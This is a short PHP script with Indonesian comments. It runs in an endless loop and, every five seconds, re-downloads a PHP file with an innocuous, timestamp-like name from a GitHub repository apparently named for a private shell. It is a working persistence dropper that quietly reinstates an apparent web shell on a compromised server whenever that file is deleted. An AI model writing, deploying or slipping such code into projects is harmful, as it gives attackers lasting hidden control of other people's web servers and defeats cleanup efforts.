<?php

// Loop tak terbatas
while (true) {
    // Nama file yang ingin dipastikan ada
    $outputFile = '20220727061038_KGB.php';
    // URL sumber data
    $url = 'https://raw.githubusercontent.com/kennn404/shellpribadi/refs/heads/main/in.txt';

    // Mengecek apakah file sudah ada
    if (!file_exists($outputFile)) {
        // Jika file tidak ada, gunakan wget untuk mengunduh file
        $command = "wget --quiet --output-document=$outputFile $url 2>/dev/null";
        exec($command, $output, $returnVar);

        // Memastikan unduhan berhasil
        if ($returnVar !== 0) {
            // Jika gagal mengunduh, hentikan skrip
            exit;
        }
    }

    // Menunggu selama 5 detik sebelum mengulangi
    sleep(5);
}
